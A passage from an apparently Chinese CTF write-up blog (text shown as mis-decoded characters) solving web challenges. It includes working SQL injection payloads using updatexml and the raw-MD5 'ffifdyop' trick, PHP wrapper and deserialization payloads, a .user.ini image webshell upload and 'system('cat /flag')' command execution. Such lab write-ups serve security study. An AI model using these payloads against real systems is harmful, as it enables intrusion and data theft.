å®¡è®¡ï¼šä»¥postæ–¹å¼ä¼ å‚ï¼Œmoney=100000000ï¼Œpasswordæ»¡è¶³ç­‰äº404ï¼Œä½†æ˜¯ä¸èƒ½ä¸ºæ•°å­—ï¼Œæ‰€ä»¥passwordç­‰äº404+ä»»æ„å­—ç¬¦<br/> ä½¿ç”¨burpsuiteæŠ“åŒ…</p>\n<p>æ€»ç»“ä¸€ä¸‹éœ€è¦æ»¡è¶³å››ä¸ªæ¡ä»¶ï¼š<code>å‰é¢æç¤ºå¿…é¡»æ˜¯cuitçš„å­¦ç”Ÿ</code>ï¼›<code>ä»¥postæ–¹å¼ä¼ å‚</code>ï¼›<code>money=100000000</code>ï¼›<code>password=404a</code>ã€‚</p>\n<p>æ‰€ä»¥ä¿®æ”¹cookieé‡Œçš„<code>user=0</code>ä¸º<code>user=1</code></p>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\98a9aa539adb4e43a11b0669cd663541.png\"/></p>\n<p><code>password=404a&amp;money=100000000</code>ï¼Œ<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\92dda9d526ac4114bc86de0447f3bc8f.png\"/>è¿™é‡Œæç¤ºæ•°å­—å¤ªé•¿<br/> <code>password=404a&amp;money=1e9</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\3abefc60c90a43298945751deb015bff.png\"/></p>\n<h1><a id=\"BJDCTF2020Easy_MD5_988\"></a>[BJDCTF2020]Easy MD5</h1>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\3e0ef1a33b264cc595d21b54ed75513b.png\"/><br/> æŸ¥çœ‹æºä»£ç æ²¡æœ‰ä»€ä¹ˆå‘ç°ï¼ŒæŠ“åŒ…çœ‹ä¸€çœ‹</p>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\33e5890b700549a7b786ddc921976b08.png\"/>çº¿ç´¢æš—ç¤ºï¼š<code>Hint: select * from 'admin' where password=md5($pass,true)</code></p>\n<p><strong>md5(string,raw)</strong></p>\n<table><thead><tr><th>å‚æ•°</th><th>æè¿°</th></tr></thead><tbody><tr><td>string</td><td>å¿…éœ€ã€‚è§„å®šè¦è®¡ç®—çš„å­—ç¬¦ä¸²ã€‚</td></tr><tr><td>raw</td><td>å¯é€‰ã€‚è§„å®šåå…­è¿›åˆ¶æˆ–äºŒè¿›åˆ¶è¾“å‡ºæ ¼å¼ï¼š TRUE - åŸå§‹ 16 å­—ç¬¦äºŒè¿›åˆ¶æ ¼å¼ï¼›FALSE - é»˜è®¤ã€‚32 å­—ç¬¦åå…­è¿›åˆ¶æ•°</td></tr></tbody></table>\n<p>ç°åœ¨éœ€è¦æ„é€ oræ¥ç»•è¿‡passwordï¼Œ<code>md5(ffifdyop,true)='or'6\\xc9]\\x99\\xe9!r,\\xf9\\xedb\\x1c</code><br/> åŸsqlæŸ¥è¯¢è¯­å¥åˆ™å˜ä¸º<code>select * from user where username ='admin' and password =''or'6\\xc9]\\x99\\xe9!r,\\xf9\\xedb\\x1c'</code>å³å¯ç»•è¿‡<br/> ç±»ä¼¼çš„å­—ç¬¦ä¸²è¿˜æœ‰:<code>md5(129581926211651571912466741651878684928,true)=\\x06\\xdaT0D\\x9f\\x8fo#\\xdf\\xc1'or'8</code><br/> åœ¨è¾“å…¥ffifdyopåï¼Œå‡ºç°</p>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\5ba842dd7f434727a2fdd3edf9a957d4.png\"/></p>\n<p>æŸ¥çœ‹æºç <br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\876c307af33d4554bf78653e837b2687.png\"/><br/> è¿™é‡Œå°±éœ€è¦çŸ¥é“ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼šmd5åŠ å¯†åçš„å€¼å¼€å¤´ä¸º0Eæ˜¯ä»–ä»¬çš„å€¼ç›¸ç­‰<br/> <code>/levels91.php?a=s878926199a&amp;b=s155964671a</code><br/> å‡ºç°ä»¥ä¸‹æç¤º<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\5fd9a6ca98de47e6a32de1c28d12c992.png\"/><br/> æˆ‘ä»¬è®¿é—®levell14.php<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\9c21cd0b066740988514d2943fc74dbb.png\"/>è¿™é‡Œç”¨phpæ•°ç»„ç»•è¿‡ï¼Œç”±äºå“ˆå¸Œå‡½æ•°æ— æ³•å¤„ç†phpæ•°ç»„ï¼Œåœ¨é‡åˆ°æ•°ç»„æ—¶è¿”å›falseï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨false==falseæˆç«‹ä½¿æ¡ä»¶æˆç«‹ã€‚<br/> <code>param1[]=1&amp;param2[]=2</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\ca0ca09136aa491395a8e358dc9b3a4b.png\"/></p>\n<h1><a id=\"ZJCTF_2019NiZhuanSiWei_1018\"></a>[ZJCTF 2019]NiZhuanSiWei</h1>\n<p><strong>é¢˜ç›®ç±»å‹ï¼š<a href=\"https://blog.csdn.net/m0_52923241/article/details/115528880?spm=1001.2014.3001.5501\">ååºåˆ—åŒ–</a>+<a href=\"https://blog.csdn.net/m0_52923241/article/details/117913577\">PHPä¼ªåè®®</a></strong><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\a639350985d04b328a1fc7628dc63ff4.png\"/>è¿™é‡Œæ³¨é‡Šæç¤ºæœ‰ä¸€ä¸ªuseless.phpæ–‡ä»¶ï¼Œè®¿é—®ä¸€ä¸‹<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\bc32b2d1558e457098113721651bdf2f.png\"/><br/> å‘ç°ä»€ä¹ˆéƒ½æ²¡æœ‰</p>\n<p><strong>ä»£ç å®¡è®¡</strong>ï¼šæœ‰è¿™æ ·ä¸€è¡Œä»£ç <code>isset($text)&amp;&amp;(file_get_contents($text,'r')===\"welcome to the zjctf\"</code>ï¼Œæˆ‘ä»¬éœ€è¦ä¼ å…¥ä¸€ä¸ªå†…å®¹ä¸º<code>welcome to the zjctf</code>çš„æ–‡ä»¶ã€‚è¿™æ—¶å°±è¦ç”¨åˆ°dataåè®®ï¼Œdataåè®®é€šå¸¸æ˜¯ç”¨æ¥æ‰§è¡ŒPHPä»£ç ï¼Œä¹Ÿå¯ä»¥å°†å†…å®¹å†™å…¥dataåè®®ä¸­ï¼Œç„¶åè®©file_get_contentså‡½æ•°å–è¯»å–ã€‚æ„é€ ï¼š<code>data://text/plain,welcome to the zjctf</code>ï¼Œä¸ºäº†ç»•è¿‡æŸäº›è¿‡æ»¤ï¼Œè¿™é‡Œç”¨åˆ°base64ç¼–ç ã€‚<strong>æ„é€ payload</strong>ï¼š<code>text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</code>ã€‚ç„¶åæœ‰ä¸€ä¸ªå¯æ§å‚æ•°fileï¼Œæ„é€ <code>file=useless.php</code>ï¼Œä½†æ˜¯é’ˆå¯¹phpæ–‡ä»¶æˆ‘ä»¬éœ€è¦è¿›è¡Œbase64ç¼–ç ï¼Œå¦åˆ™è¯»å–ä¸åˆ°å…¶å†…å®¹ï¼Œæ‰€ä»¥æ„é€ payloadï¼š<code>file=php://filter/read=convert.base64-encode/resource=useless.php</code>ã€‚<br/> å¾—åˆ°ä»¥ä¸‹ç»è¿‡base64åŠ å¯†çš„å­—ç¬¦ï¼Œ<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\ccf5fc4e71cb49289583a7dc58f24d20.png\"/><br/> æ¥ä¸‹æ¥è¿›è¡Œbase64è§£å¯†ï¼Œå¾—åˆ°useless.phpå†…å®¹</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>  \n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Flag</span><span class=\"token punctuation\">{<!-- --></span>  <span class=\"token comment\">//flag.php  </span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">;</span>  \n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__tostring</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>  \n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>  \n            <span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;br&gt;\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"U R SO CLOSE !///COME ON PLZ\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>  \n    <span class=\"token punctuation\">}</span>  \n<span class=\"token punctuation\">}</span>  \n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>  \n\n</code></pre>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>  \n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Flag</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$file</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">;</span>  \n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__tostring</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>  \n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>  \n            <span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;br&gt;\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"U R SO CLOSE !///COME ON PLZ\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>  \n    <span class=\"token punctuation\">}</span>  \n<span class=\"token punctuation\">}</span> \n<span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Flag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span> \n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>  \n\n</code></pre>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\efd314d6aa954a51a7d032e3e22562b3.png\"/><br/> æ•…æœ€åpayloadä¸º<code>/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:\"Flag\":1:{s:4:\"file\";s:8:\"flag.php\";}</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\f17d4c06cbde44489f57594b5eb43841.png\"/>æŸ¥çœ‹æºç <br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\39661c3755464b8c954ebe9f679c35fb.png\"/></p>\n<h1><a id=\"SUCTF_2019CheckIn_1069\"></a>[SUCTF 2019]CheckIn</h1>\n<p><a href=\"https://blog.csdn.net/m0_52923241/article/details/119751029?spm=1001.2014.3001.5502\">å…·ä½“çŸ¥è¯†ç‚¹ç‚¹è¿™é‡Œ</a></p>\n<ul><li> <p><strong>æ–¹æ³•ä¸€</strong>ï¼šuser.iniæ–‡ä»¶æ„æˆPHPåé—¨</p> <p>åˆ›å»º<code>.user.ini</code>æ–‡ä»¶ï¼Œå‰é¢çš„<code>GIF</code>æ˜¯ä¸ºäº†ç»•è¿‡æ£€æµ‹ï¼›å› ä¸ºåå°ç”¨exif_imagetypeå‡½æ•°æ£€æµ‹æ–‡ä»¶ç±»å‹ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨æ–‡ä»¶å‰åŠ ä¸Šå›¾ç‰‡çš„ç‰¹å¾ï¼Œæ¥ç»•è¿‡æ£€æµ‹ã€‚<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\8e70b7499e6d4d99b9cde65408ef438e.png\"/></p> <p>ä¸Šä¼ <br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\fb0dcebfd0f241f79cead5c38e18cb47.png\"/></p> <p>åˆ›å»ºå›¾ç‰‡æ–‡ä»¶<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\afc0014a57a9443bade70663880c4cdc.png\"/></p> <p>ä¸Šä¼ <br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\8a6e24be50714bb1992399de03b222cf.png\"/><br/> èšå‰‘é“¾æ¥<code>http://5df3767e-4da9-41f9-85fc-6629510b2f2b.node4.buuoj.cn:81/uploads/ea6cf191dc7eec7b0e43199e459204e5/index.php</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\8d30485cbe6344af8bc5bfb2c70e5ec3.png\"/><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\7ab8a8b40aeb488ca6eb142224439ff6.png\"/><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\ae78e22f72504edd8a0668c6388a2dd8.png\"/><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\c881f47671fe427a9f7e5d1bb59c8ae5.png\"/>æ‹¿åˆ°flag~~</p> </li><li> <p><strong>æ–¹æ³•äºŒ</strong>ï¼šå‘½ä»¤æ‰§è¡Œ</p> <p>ä¸Šä¼ å›¾ç‰‡é©¬åï¼Œæ‰«ææ ¹ç›®å½•ï¼š<code>/index.php?a=var_dump(scandir(\"/\"));</code><br/> æˆ‘ä»¬å¯ä»¥å¯ä»¥çœ‹è§ä¸€ä¸ªå«flagçš„æ–‡ä»¶<br/> <code>/index.php?a=var_dump(file_get_contents(\"/flag\"));</code>or<code>/index.php?a=system('cat /flag');</code></p> </li></ul>\n<h1><a id=\"_2019HardSQL_1098\"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL</h1>\n<p>ç»æµ‹è¯•ï¼Œä¸€äº›andã€unionã€selectã€ç©ºæ ¼ç­‰å¸¸è§çš„SQLè¯­å¥è¢«è¿‡æ»¤äº†</p>\n<blockquote>\n<p><strong>updataxml()å‡½æ•°ç”¨æ³•</strong></p>\n<p>UPDATEXML (XML_document, XPath_string, new_value);</p>\n<p>ç¬¬ä¸€ä¸ªå‚æ•°ï¼šXML_documentæ˜¯Stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°ï¼Œæ–‡ä¸­ä¸ºDoc<br/> ç¬¬äºŒä¸ªå‚æ•°ï¼šXPath_string(Xpathæ ¼å¼çš„å­—ç¬¦ä¸²) ï¼Œå¦‚æœä¸äº†è§£Xpathè¯­æ³•ï¼Œå¯ä»¥åœ¨ç½‘ä¸ŠæŸ¥æ‰¾æ•™ç¨‹ã€‚<br/> ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šnew_valueï¼ŒStringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ® ä½œç”¨ï¼šæ”¹å˜æ–‡æ¡£ä¸­ç¬¦åˆæ¡ä»¶çš„èŠ‚ç‚¹<br/> ä¾‹ï¼šç¬¬äºŒä¸ªå‚æ•°ä½¿ç”¨ä¸ç¬¦åˆè¯­æ³•çš„å‚æ•°ï¼Œå°±ä¼šçˆ†å‡ºé”™è¯¯ä¿¡æ¯</p>\n</blockquote>\n<ul><li>çˆ†åº“åï¼š<code>?username=admin'or(updatexml(1,concat(0x7e,database(),0x7e),1))%23&amp;password=111</code>â€”â€”geek</li><li>çˆ†è¡¨åï¼š<code>?username=admin%27or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(%27geek%27)),0x7e),1))%23&amp;password=111</code>â€”â€”H4rDsq1</li><li>çˆ†å­—æ®µï¼š<code>?username=admin%27or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(%27H4rDsq1%27)),0x7e),1))%23&amp;password=111</code>â€”â€”id,username,password</li><li>çˆ†æ•°æ®ï¼š<code>?username=admin%27or(updatexml(1,concat(0x7e,(select(password)from(H4rDsq1)),0x7e),1))%23&amp;password=111</code>â€”â€”flag{2ffec74c-5046-40b9-b115-ed<br/> è¿™é‡Œåªçˆ†å‡ºå‰é¢ä¸€éƒ¨åˆ†flagï¼Œç„¶åå†ä½¿ç”¨right()å‡½æ•°æ‹¼æ¥flag<br/> <code>?username=admin'or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))%23&amp;password=111</code>â€”â€”6-40b9-b115-edce687a298b}</li></ul>\n<h1><a id=\"_2020_AreUSerialz_1116\"></a>[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</h1>\n<p><strong>é¢˜ç›®ç±»å‹ï¼šPHPåºåˆ—åŒ–+ä»£ç å®¡è®¡</strong></p>\n<pre><code class=\"prism language-php\"> <span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php\n\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">FileHandler</span> <span class=\"token punctuation\">{<!-- --></span>\n\n    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$op</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$filename</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$content</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token comment\">//ç±»ä¸€æ‰§è¡Œå°±å¼€å§‹è°ƒç”¨ï¼Œå…¶ä½œç”¨æ˜¯æ‹¿æ¥åˆå§‹åŒ–ä¸€äº›å€¼ã€‚</span>\n\t<span class=\"token comment\">//åˆ›å»ºå¯¹è±¡æ—¶è§¦å‘</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$op</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$filename</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"/tmp/tmpfile\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$content</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"Hello World!\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">process</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">process</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">op</span> <span class=\"token operator\">==</span> <span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">op</span> <span class=\"token operator\">==</span> <span class=\"token string double-quoted-string\">\"2\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token variable\">$res</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">output</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$res</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">output</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Bad Hacker!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">function</span> <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">filename</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">content</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">string</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">content</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&gt;</span> <span class=\"token number\">100</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n                <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">output</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Too long!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n            <span class=\"token variable\">$res</span> <span class=\"token operator\">=</span> <span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">filename</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">content</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$res</span><span class=\"token punctuation\">)</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">output</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Successful!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">else</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">output</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Failed!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">output</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Failed!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">function</span> <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$res</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">filename</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token variable\">$res</span> <span class=\"token operator\">=</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">filename</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$res</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">function</span> <span class=\"token function\">output</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"[Result]: &lt;br&gt;\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$s</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\t<span class=\"token comment\">//ã€€ç±»æ‰§è¡Œå®Œæ¯•ä»¥åè°ƒç”¨ï¼Œå…¶æœ€ä¸»è¦çš„ä½œç”¨æ˜¯æ‹¿æ¥åšåƒåœ¾å›æ”¶æœºåˆ¶ã€‚</span>\n\t<span class=\"token comment\">//å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">op</span> <span class=\"token operator\">===</span> <span class=\"token string double-quoted-string\">\"2\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span 